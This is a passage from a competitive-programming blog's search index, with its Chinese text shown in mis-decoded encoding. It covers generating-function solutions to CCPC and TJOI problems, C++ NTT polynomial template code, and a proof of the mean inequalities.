{c_i \\brace k} \\times k! \\sum_{j = 0} ^ {\\infty}\\binom{j}{k} x ^ j $$ ç°åœ¨è€ƒè™‘åŒ–ç®€ $\\sum\\limits_{j = 0} ^ {\\infty}\\dbinom{j}{k} x ^ j$ï¼Œæˆ‘ä»¬æ ¹æ®å¹¿ä¹‰äºŒé¡¹å¼å®šç†çŸ¥é“ $\\sum\\limits_{i = 0} ^ {\\infty} \\dbinom{i + k - 1}{i}x ^ i$ çš„å°é—­å½¢å¼ä¸º $\\dfrac{1}{(1 - x) ^ k}$ï¼Œé‚£ä¹ˆ $\\sum\\limits_{i = 0} ^ {\\infty} \\dbinom{i + k}{i}x ^ i = \\dfrac{1}{(1 - x) ^ {k + 1}}$ ç”±ç»„åˆæ•°æ€§è´¨æœ‰ $\\dbinom{i + k}{i}=\\dbinom{i + k}{k}$ï¼Œæ‰€ä»¥ $\\sum\\limits_{i = 0} ^ {\\infty} \\dbinom{i + k}{i}x ^ i = \\sum\\limits_{i = 0} ^ {\\infty} \\dbinom{i + k}{k}x ^ i = \\sum\\limits_{i = k} ^ {\\infty} \\dbinom{i}{k}x ^ {i - k} = \\dfrac{1}{(1 - x) ^ {k + 1}}$ å†ç­‰å¼ä¸¤è¾¹åŒä¹˜ $x ^ k$ï¼Œå¾—å‡ºç»“è®º $$ \\sum_{i = 0} ^ {\\infty} \\binom{i}{k}x ^ i = \\frac{x ^ k}{(1 - x) ^ {k + 1}} $$ (ç”±äº $\\dbinom{n}{m}$ åœ¨ $n \u003c m$ æ—¶ä¸º $0$ï¼Œæ‰€ä»¥ $i$ ä» $0$ æˆ–ä» $k$ å¼€å§‹éƒ½ä¸€æ ·) æ‰€ä»¥è¿›ä¸€æ­¥åŒ–ç®€äº† $f_i(x)$ï¼Œä¸º $$ f_i(x) = \\sum_{k = 0} ^ {c_i} {c_i \\brace k} \\times k! \\times \\frac{x ^ k}{(1 - x) ^ {k + 1}} $$ å°½ç®¡å¦‚æ­¤ï¼Œ$f_i(x)$ ä»ç„¶ä¸å¥½ç®—ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°é¢˜ç›®æ¡ä»¶ $\\sum\\limits_{i = 1} ^ {n} c_i \\le 10 ^ 5$ï¼Œä¸€èˆ¬ä¼šå¾€åˆ†æ²» $\\texttt{NTT}$ ä¸Šè€ƒè™‘ï¼Œæˆ‘ä»¬ä¸å¦¨å°† $f_i(x)$ çš„å½¢å¼å˜æˆ $$ f_i(x) = \\sum\\limits_{k = 0} ^ {c_i} {c_i \\brace k} \\times k! \\times (\\frac{x}{1-x}) ^ {k} \\times \\frac{1}{1 - x} $$ æ­¤æ—¶å¦‚æœä»¤ $y = \\dfrac{x}{1 - x},f_i(x) = g_i(y) \\times \\dfrac{1}{1 - x}$ï¼Œå…¶ä¸­ $g_i(y) = \\sum\\limits_{k = 0} ^ {c_i} {c_i \\brace k} \\times k! \\times y ^ {k}$ é‚£ä¹ˆç­”æ¡ˆå°±ä¸º $$ [x ^ W] \\frac{\\prod_{j = 1} ^ {n} g_j(y)}{(1 - x) ^ {n + 1}} $$ è¿™æ ·çš„è¯ $\\prod\\limits_{j = 1} ^ {n} g_j(y)$ æ˜¯å¯ä»¥ç”¨åˆ†æ²» $\\texttt{NTT}$ æ±‚è§£çš„ï¼Œå…¶ä¸­éœ€è¦ç”¨åˆ°å¿«é€Ÿæ±‚è§£ç¬¬äºŒç±»æ–¯ç‰¹æ—æ•°çš„æ¯ä¸€è¡Œï¼Œæ±‚å‡ºä¹‹åè€ƒè™‘è®¡ç®—ç¬¬ $W$ é¡¹çš„ç³»æ•°ã€‚ ä»¤ $F(x) = \\prod\\limits_{j = 1} ^ {n} g_j(y)$ï¼Œé‚£ä¹ˆ $F(x)$ çš„ç¬¬ $k$ é¡¹å°±å½¢å¦‚ $a_k \\times (\\dfrac{x}{1 - x}) ^ k$ï¼Œå…¶ä¸­ $a_k$ ä¸º $F(x)$ çš„ç¬¬ $k$ é¡¹ç³»æ•°ï¼Œé‚£ä¹ˆ $a_k \\times (\\dfrac{x}{1 - x}) ^ k = a_k \\times x ^ k \\times \\dfrac{1}{(1 - x) ^ k}$ï¼ŒæŠŠ $\\dfrac{1}{(1 - x) ^ k}$ æ‹¿åˆ°ä¸‹é¢ï¼Œå˜ä¸º $\\dfrac{1}{(1 - x) ^ {n + k + 1}}$ ç”±äº $F(x)$ é¡¹æ•°è¾ƒå°‘ï¼Œæ‰€ä»¥è€ƒè™‘æšä¸¾ $F(x)$ çš„æ¯ä¸€é¡¹ï¼Œå³ç­”æ¡ˆä¸º $a_k$ ä¸ $\\dfrac{1}{(1 - x) ^ {n + k + 1}}$ çš„ç¬¬ $W - k$ é¡¹çš„ä¹˜ç§¯ä¹‹å’Œï¼Œè€ƒè™‘å±•å¼€ $\\dfrac{1}{(1 - x) ^ {n + k + 1}} = \\sum\\limits_{i = 0} ^ {\\infty} \\dbinom{n + k + i}{i}x ^ i$ï¼Œæ‰€ä»¥ç¬¬ $W - k$ é¡¹ä¸º $\\dbinom{W + n}{W - k}$ï¼Œè™½ç„¶ $W$ è¾ƒå¤§ï¼Œä½† $n$ å¾ˆå°ï¼Œç»å…¸ç»´æŠ¤ $W$ çš„ä¸‹é™å¹‚å³å¯ã€‚ ","date":"2022-10-16","objectID":"/posts/cp2021-ccpc-%E5%B9%BF%E5%B7%9E-a-math-ball/:0:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"[2021 CCPC å¹¿å· A] Math Ball","uri":"/posts/cp2021-ccpc-%E5%B9%BF%E5%B7%9E-a-math-ball/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } template\u003cint mod\u003e struct ModInt { int x; ModInt() : x(0) {} ModInt(i64 y) : x(y \u003e= 0 ? y % mod : (mod - (-y) % mod) % mod) {} ModInt \u0026operator+=(const ModInt \u0026p) { if ((x += p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator-=(const ModInt \u0026p) { if ((x += mod - p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator*=(const ModInt \u0026p) { x = (int)(1LL * x * p.x % mod); return *this; } ModInt \u0026operator/=(const ModInt \u0026p) { *this *= p.inv(); return *this; } ModInt operator-() const { return ModInt(-x); } ModInt operator+(const ModInt \u0026p) const { return ModInt(*this) += p; } ModInt operator-(const ModInt \u0026p) const { return ModInt(*this) -= p; } ModInt operator*(const ModInt \u0026p) const { return ModInt(*this) *= p; } ModInt operator/(const ModInt \u0026p) const { return ModInt(*this) /= p; } bool operator==(const ModInt \u0026p) const { return x == p.x; } bool operator!=(const ModInt \u0026p) const { return x != p.x; } ModInt inv() const { int a = x, b = mod, u = 1, v = 0, t; while (b \u003e 0) { t = a / b; swap(a -= t * b, b); swap(u -= t * v, v); } return ModInt(u); } ModInt pow(i64 n) const { ModInt res(1), mul(x); while (n \u003e 0) { if (n \u0026 1) res *= mul; mul *= mul; n \u003e\u003e= 1; } return res; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const ModInt \u0026p) { return os \u003c\u003c p.x; } friend istream \u0026operator\u003e\u003e(istream \u0026is, ModInt \u0026a) { i64 t; is \u003e\u003e t; a = ModInt\u003cmod\u003e(t); return (is); } int val() const { return x; } static constexpr int val_mod() { return mod; } }; using Z = ModInt\u003cmod\u003e; vector\u003cZ\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i; } infact[n] = fact[n].inv(); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i; } } Z C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return Z(0); return fact[n] * infact[n - m] * infact[m]; } vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*","date":"2022-10-16","objectID":"/posts/cp2021-ccpc-%E5%B9%BF%E5%B7%9E-a-math-ball/:1:0","tags":["ç”Ÿæˆå‡½æ•°","å¤šé¡¹å¼"],"title":"[2021 CCPC å¹¿å· A] Math Ball","uri":"/posts/cp2021-ccpc-%E5%B9%BF%E5%B7%9E-a-math-ball/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ ç»™å®š $n$ ä¸ªæ­£æ•´æ•° $a_1,a_2,\\cdots,a_n$ï¼Œå¹¶ç»™å®šæ­£æ•´æ•° $m$ï¼Œå¯¹äºæ¯ä¸ª $k \\in [1, m]$ï¼Œè®¡ç®— $\\prod\\limits_{i = 1} ^ {n} \\dbinom{k}{a_i}$ å¯¹ $998,244,353$ å–æ¨¡ã€‚ $(1 \\le n, m \\le 5 \\times 10 ^ 4, \\sum\\limits_{i = 1} ^ {n}a_i \\le 10 ^ 5)$ åˆ†æï¼š è€ƒè™‘æ‹†ç»„åˆæ•° $$ \\prod_{i = 1} ^ {n}\\binom{k}{a_i}=\\prod_{i = 1} ^ {n}\\frac{k!}{a_i! \\times (k - a_i)!} \\ = \\frac{1}{\\prod\\limits_{i = 1} ^ {n}a_i!} \\times \\prod_{i = 1} ^ {n} k ^ {\\underline {a_i}} $$ æ‰€ä»¥å¯ä»¥æŠŠ $k ^ {\\underline{a_i}}$ çœ‹ä½œä¸€ä¸ªä¸‹é™å¹‚å¤šé¡¹å¼ï¼Œé‚£ä¹ˆä½¿ç”¨åˆ†æ²»ä¸‹é™å¹‚å¤šé¡¹å¼ä¹˜æ³•å¯ä»¥æ±‚å‡º $\\prod\\limits_{i = 1} ^ {n} k ^ {\\underline {a_i}}$ï¼Œå†è½¬ä¸ºæ™®é€šå¹‚å¤šé¡¹å¼ï¼Œå†å¯¹ $(1, 2, \\cdots,m)$ ä½¿ç”¨å¤šé¡¹å¼å¤šç‚¹æ±‚å€¼å³å¯æ±‚å‡ºç­”æ¡ˆï¼Œæ—¶é—´å¤æ‚åº¦ $O(n\\log ^ 2 n)$ ","date":"2022-10-04","objectID":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7g-shinyruo-and-kfc/:0:0","tags":["ä¸‹é™å¹‚å¤šé¡¹å¼","å¤šé¡¹å¼å¤šç‚¹æ±‚å€¼"],"title":"[2021CCPC å¨æµ·G] Shinyruo and KFC","uri":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7g-shinyruo-and-kfc/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } template\u003cint mod\u003e struct ModInt { int x; ModInt() : x(0) {} ModInt(i64 y) : x(y \u003e= 0 ? y % mod : (mod - (-y) % mod) % mod) {} ModInt \u0026operator+=(const ModInt \u0026p) { if ((x += p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator-=(const ModInt \u0026p) { if ((x += mod - p.x) \u003e= mod) x -= mod; return *this; } ModInt \u0026operator*=(const ModInt \u0026p) { x = (int)(1LL * x * p.x % mod); return *this; } ModInt \u0026operator/=(const ModInt \u0026p) { *this *= p.inv(); return *this; } ModInt operator-() const { return ModInt(-x); } ModInt operator+(const ModInt \u0026p) const { return ModInt(*this) += p; } ModInt operator-(const ModInt \u0026p) const { return ModInt(*this) -= p; } ModInt operator*(const ModInt \u0026p) const { return ModInt(*this) *= p; } ModInt operator/(const ModInt \u0026p) const { return ModInt(*this) /= p; } bool operator==(const ModInt \u0026p) const { return x == p.x; } bool operator!=(const ModInt \u0026p) const { return x != p.x; } ModInt inv() const { int a = x, b = mod, u = 1, v = 0, t; while (b \u003e 0) { t = a / b; swap(a -= t * b, b); swap(u -= t * v, v); } return ModInt(u); } ModInt pow(i64 n) const { ModInt res(1), mul(x); while (n \u003e 0) { if (n \u0026 1) res *= mul; mul *= mul; n \u003e\u003e= 1; } return res; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const ModInt \u0026p) { return os \u003c\u003c p.x; } friend istream \u0026operator\u003e\u003e(istream \u0026is, ModInt \u0026a) { i64 t; is \u003e\u003e t; a = ModInt\u003cmod\u003e(t); return (is); } int val() const { return x; } static constexpr int val_mod() { return mod; } }; using Z = ModInt\u003cmod\u003e; vector\u003cZ\u003e fact, infact; void init(int n) { fact.resize(n + 1), infact.resize(n + 1); fact[0] = infact[0] = 1; for (int i = 1; i \u003c= n; i ++) { fact[i] = fact[i - 1] * i; } infact[n] = fact[n].inv(); for (int i = n; i; i --) { infact[i - 1] = infact[i] * i; } } Z C(int n, int m) { if (n \u003c 0 || m \u003c 0 || n \u003c m) return Z(0); return fact[n] * infact[n - m] * infact[m]; } vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*","date":"2022-10-04","objectID":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7g-shinyruo-and-kfc/:1:0","tags":["ä¸‹é™å¹‚å¤šé¡¹å¼","å¤šé¡¹å¼å¤šç‚¹æ±‚å€¼"],"title":"[2021CCPC å¨æµ·G] Shinyruo and KFC","uri":"/posts/cp2021ccpc-%E5%A8%81%E6%B5%B7g-shinyruo-and-kfc/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"åŸé¢˜é“¾æ¥ é¢˜æ„ æœ‰ $4$ ç±»æ•°é‡åˆ†åˆ«ä¸º $a,b,c,d$ çš„ç‰©å“ï¼Œæ±‚å‡ºé•¿åº¦ä¸º $n$ çš„æ‰€æœ‰ä¸åŒ…å« abcd å­ä¸²çš„åºåˆ—çš„æ–¹æ¡ˆæ•°ï¼Œå¯¹ $998, 244 , 353$ å–æ¨¡ã€‚ åˆ†æï¼š æ­¤é¢˜æ¯”è¾ƒåƒ 2022 ç‰›å®¢å¤šæ ¡2 Eï¼Œè€ƒè™‘å°† abcd æ†ç»‘ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç®—å‡ºè‡³å°‘å­˜åœ¨ $i$ ä¸ª abcd å­ä¸²çš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆä¼šæœ‰ $n - 4 \\times i + i = n - 3 \\times i$ ä¸ªä½ç½®ï¼Œä»ä¸­é€‰å‡º $i$ ä¸ªä½ç½®çš„æ–¹æ¡ˆæ•°ä¸º $\\dbinom{n - 3 \\times i}{i}$ï¼Œé‚£ä¹ˆç°åœ¨è¦è§£å†³çš„é—®é¢˜æ˜¯ä»å‰©ä¸‹ $n - 4 \\times i$ ä¸ªä½ç½®éšæ„é€‰ $a,b,c,d$ çš„æ–¹æ¡ˆæ•°ï¼Œæˆ‘ä»¬å¯ä»¥å†™å‡ºå®ƒä»¬çš„ç”Ÿæˆå‡½æ•°ï¼Œè®° $$ F_k(x) = \\sum_{i = 0} ^ {k} \\frac{x ^ i}{i!} $$ é‚£ä¹ˆ $a,b,c,d$ çš„ç”Ÿæˆå‡½æ•°åˆ†åˆ«ä¸º $F_{a - i}(x),F_{b - i}(x),F_{c - i}(x),F_{d - i}(x)$ï¼Œæ‰€ä»¥æ–¹æ¡ˆæ•°ä¸º $(n - 4 \\times i)! \\times [x ^ {n - 4 \\times i}]F_{a - i}(x) * F_{b - i}(x) * F_{c - i}(x) * F_{d - i}(x)$ï¼Œæˆ‘ä»¬ç°åœ¨æ±‚å‡ºäº†è‡³å°‘ä¸º $i$ çš„æ–¹æ¡ˆæ•°ï¼Œå¯ä»¥ç”¨äºŒé¡¹å¼åæ¼”æ±‚å‡ºæ°å¥½ä¸º $0$ çš„æ–¹æ¡ˆæ•°ï¼Œé‚£ä¹ˆç­”æ¡ˆå°±æ˜¯ $$ \\sum_{i = 0} ^ {\\min(a,b,c,d)} (-1) ^ i \\times \\binom{n - 3 \\times i}{i} \\times (n - 4 \\times i)! \\times [x ^ {n - 4 \\times i}]F_{a - i}(x) * F_{b - i}(x) * F_{c - i}(x) * F_{d - i}(x) $$ ","date":"2022-09-22","objectID":"/posts/cptjoi2019-%E5%94%B1%E8%B7%B3rap%E5%92%8C%E7%AF%AE%E7%90%83/:0:0","tags":["äºŒé¡¹å¼åæ¼”","NTT"],"title":"[TJOI2019] å”±ã€è·³ã€rapå’Œç¯®çƒ","uri":"/posts/cptjoi2019-%E5%94%B1%E8%B7%B3rap%E5%92%8C%E7%AF%AE%E7%90%83/"},{"categories":["ç®—æ³•ç«èµ›"],"content":"ä»£ç ï¼š #pragma GCC optimize(2) #pragma GCC optimize(3) #include \u003cbits/stdc++.h\u003e using namespace std; using i64 = long long; constexpr int mod = 998244353; int norm(int x) { if (x \u003c 0) { x += mod; } if (x \u003e= mod) { x -= mod; } return x; } template\u003cclass T\u003e T power(T a, int b) { T res = 1; for (; b; b /= 2, a *= a) { if (b % 2) { res *= a; } } return res; } struct Z { int x; Z(int x = 0) : x(norm(x)) {} int val() const { return x; } Z operator-() const { return Z(norm(mod - x)); } Z inv() const { assert(x != 0); return power(*this, mod - 2); } Z \u0026operator*=(const Z \u0026rhs) { x = i64(x) * rhs.x % mod; return *this; } Z \u0026operator+=(const Z \u0026rhs) { x = norm(x + rhs.x); return *this; } Z \u0026operator-=(const Z \u0026rhs) { x = norm(x - rhs.x); return *this; } Z \u0026operator/=(const Z \u0026rhs) { return *this *= rhs.inv(); } friend Z operator*(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res *= rhs; return res; } friend Z operator+(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res += rhs; return res; } friend Z operator-(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res -= rhs; return res; } friend Z operator/(const Z \u0026lhs, const Z \u0026rhs) { Z res = lhs; res /= rhs; return res; } friend istream \u0026operator\u003e\u003e(istream \u0026is, Z \u0026a) { i64 v; is \u003e\u003e v; a = Z(v); return is; } friend ostream \u0026operator\u003c\u003c(ostream \u0026os, const Z \u0026a) { return os \u003c\u003c a.val(); } }; vector\u003cint\u003e rev; vector\u003cZ\u003e roots{0, 1}; void dft(vector\u003cZ\u003e \u0026a) { int n = a.size(); if (int(rev.size()) != n) { int k = __builtin_ctz(n) - 1; rev.resize(n); for (int i = 0; i \u003c n; i ++) { rev[i] = rev[i \u003e\u003e 1] \u003e\u003e 1 | (i \u0026 1) \u003c\u003c k; } } for (int i = 0; i \u003c n; i ++) { if (rev[i] \u003c i) { swap(a[i], a[rev[i]]); } } if (int(roots.size()) \u003c n) { int k = __builtin_ctz(roots.size()); roots.resize(n); while ((1 \u003c\u003c k) \u003c n) { Z e = power(Z(3), (mod - 1) \u003e\u003e (k + 1)); for (int i = 1 \u003c\u003c (k - 1); i \u003c (1 \u003c\u003c k); i ++) { roots[i \u003c\u003c 1] = roots[i]; roots[i \u003c\u003c 1 | 1] = roots[i] * e; } k ++; } } for (int k = 1; k \u003c n; k *= 2) { for (int i = 0; i \u003c n; i += 2 * k) { for (int j = 0; j \u003c k; j ++) { Z u = a[i + j], v = a[i + j + k] * roots[k + j]; a[i + j] = u + v, a[i + j + k] = u - v; } } } } void idft(vector\u003cZ\u003e \u0026a) { int n = a.size(); reverse(a.begin() + 1, a.end()); dft(a); Z inv = (1 - mod) / n; for (int i = 0; i \u003c n; i ++) { a[i] *= inv; } } struct Poly { vector\u003cZ\u003e a; Poly() {} Poly(const vector\u003cZ\u003e \u0026a) : a(a) {} Poly(const initializer_list\u003cZ\u003e \u0026a) : a(a) {} int size() const { return a.size(); } void resize(int n) { a.resize(n); } Z operator[](int idx) const { if (idx \u003c size()) { return a[idx]; } else { return 0; } } Z \u0026operator[](int idx) { return a[idx]; } Poly mulxk(int k) const { auto b = a; b.insert(b.begin(), k, 0); return Poly(b); } Poly modxk(int k) const { k = min(k, size()); return Poly(vector\u003cZ\u003e(a.begin(), a.begin() + k)); } Poly divxk(int k) const { if (size() \u003c= k) { return Poly(); } return Poly(vector\u003cZ\u003e(a.begin() + k, a.end())); } friend Poly operator+(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] + b[i]; } return Poly(res); } friend Poly operator-(const Poly \u0026a, const Poly \u0026b) { vector\u003cZ\u003e res(max(a.size(), b.size())); for (int i = 0; i \u003c int(res.size()); i ++) { res[i] = a[i] - b[i]; } return Poly(res); } friend Poly operator*(Poly a, Poly b) { if (a.size() == 0 || b.size() == 0) { return Poly(); } int sz = 1, tot = a.size() + b.size() - 1; while (sz \u003c tot) { sz *= 2; } a.a.resize(sz); b.a.resize(sz); dft(a.a); dft(b.a); for (int i = 0; i \u003c sz; i ++) { a.a[i] = a[i] * b[i]; } idft(a.a); a.resize(tot); return a; } friend Poly operator*(Z a, Poly b) { for (int i = 0; i \u003c int(b.size()); i ++) { b[i] *= a; } return b; } friend Poly operator*(Poly a, Z b) { for (int i = 0; i \u003c int(a.size()); i ++) { a[i] *= b; } return a; } Poly \u0026operator+=(Poly b) { return (*this) = (*this) + b; } Poly \u0026operator-=(Poly b) { return (*this) = (*this) - b; } Poly \u0026operator*=(Poly b) { return (*this) = (*this) * b; } Poly deriv() const { if (a.empty()) { return Poly(); } vec","date":"2022-09-22","objectID":"/posts/cptjoi2019-%E5%94%B1%E8%B7%B3rap%E5%92%8C%E7%AF%AE%E7%90%83/:1:0","tags":["äºŒé¡¹å¼åæ¼”","NTT"],"title":"[TJOI2019] å”±ã€è·³ã€rapå’Œç¯®çƒ","uri":"/posts/cptjoi2019-%E5%94%B1%E8%B7%B3rap%E5%92%8C%E7%AF%AE%E7%90%83/"},{"categories":["æ•°å­¦"],"content":"æ±‚è¯ï¼š $$ \\frac{n}{\\sum\\limits_{i = 1} ^ {n} \\dfrac{1}{x_i}} \\le \\sqrt [n] {\\prod_{i = 1} ^ {n} x_i } \\le \\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} \\le \\sqrt{\\frac{\\sum\\limits_{i = 1} ^ {n} x_i ^ 2}{n}} $$ åˆ†æï¼š å¼•ç†ï¼šç´ç”Ÿä¸ç­‰å¼ è‹¥ $f(x)$ æ˜¯åŒºé—´ $[a,b]$ çš„å‡¹å‡½æ•°ï¼Œåˆ™å¯¹ä»»æ„ $x_1,x_2,\\cdots,x_n \\in [a,b]$ æœ‰ä¸ç­‰å¼ $$ f\\left(\\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n}\\right) \\le \\frac{\\sum\\limits_{i = 1} ^ {n} f(x_i)}{n} $$ è‹¥ $f(x)$ æ˜¯åŒºé—´ $[a,b]$ çš„å‡¸å‡½æ•°ï¼Œåˆ™å¯¹ä»»æ„ $x_1,x_2,\\cdots,x_n \\in [a,b]$ æœ‰ä¸ç­‰å¼ $$ \\frac{\\sum\\limits_{i = 1} ^ {n} f(x_i)}{n}\\le f\\left(\\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n}\\right) $$ è®¾ $f(x) = \\ln x$ï¼Œæ˜“å¾— $\\ln x$ ä¸ºå‡¸å‡½æ•°ï¼Œæ‰€ä»¥æœ‰ $$ \\frac{\\sum\\limits_{i = 1} ^ {n} \\ln x_i}{n} \\le \\ln \\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} \\\\ \\Leftrightarrow \\frac{\\ln \\prod\\limits_{i = 1} ^ {n} x_i}{n} \\le \\ln \\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} \\\\ \\Leftrightarrow \\ln \\prod\\limits_{i = 1} ^ {n} x_i \\le \\ln \\left (\\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} \\right) ^ n \\\\ \\Leftrightarrow \\prod\\limits_{i = 1} ^ {n} x_i \\le \\left (\\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} \\right) ^ n \\\\ \\Leftrightarrow \\sqrt[n]{\\prod\\limits_{i = 1} ^ {n} x_i} \\le \\frac{\\sum\\limits_{i = 1} ^ {n} x_i}{n} $$ ç¬¬äºŒä¸ªä¸ç­‰å¼å¾—è¯ã€‚ è‹¥å¯¹äºç¬¬äºŒä¸ªä¸ç­‰å¼åšå˜æ¢ $x_i \\rightarrow \\dfrac{1}{x_i}$ï¼Œæœ‰ $$ \\sqrt[n]{\\prod\\limits_{i = 1} ^ {n} \\frac{1}{x_i}} \\le \\frac{\\sum\\limits_{i = 1} ^ {n} \\dfrac{1}{x_i}}{n} \\\\ \\Leftrightarrow \\frac{1}{\\sqrt[n]{\\prod\\limits_{i = 1} ^ {n} x_i}} \\le \\frac{\\sum\\limits_{i = 1} ^ {n} \\dfrac{1}{x_i}}{n} \\\\ \\Leftrightarrow \\frac{n}{\\sum\\limits_{i = 1} ^ {n} \\dfrac{1}{x_i}} \\le \\sqrt[n]{\\prod\\limits_{i = 1} ^ {n} x_i} $$ ç¬¬ä¸€ä¸ªä¸ç­‰å¼å¾—è¯ã€‚ å†è®¾ $f(x) = x ^ 